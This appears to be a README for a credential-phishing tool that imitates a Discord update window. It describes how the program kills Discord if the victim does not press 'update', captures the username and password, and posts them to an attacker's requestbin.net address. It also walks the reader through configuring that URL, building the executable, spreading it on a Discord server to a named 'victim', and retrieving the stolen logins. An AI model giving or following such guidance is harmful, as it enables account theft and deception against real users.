!!!! I have no responsibility for the use of the program  !!!!

This is a Discord fake update phising tool.

I make the form design like Discord's interface.

If you don't press the update button,the program kills the process of Discord.

You have to take a requestbin to use it. For take it (requestbin.net)

To use it you have to change the value of the reqbinurl varible to your requestbin.net address,and build the code.

For change the sln file use visual studio.

Your "Discord_Updater.exe" will be in "Discord Guncelleme Sihirbazı\Discord Guncelleme Sihirbazı\bin\Debug\" folder

If you want to make it more realistic,after build it , upload to a discord server and take the url and share with the victim.

To look at the data's, type requestbin.net/r/RequestbinAddress?inspect to take the username/password data.

The program send post requests to your requestbin adress.(The post requests includes username/password data)  

Requestbins have a limit (2 day,20 request max. for the "requestbin.net")
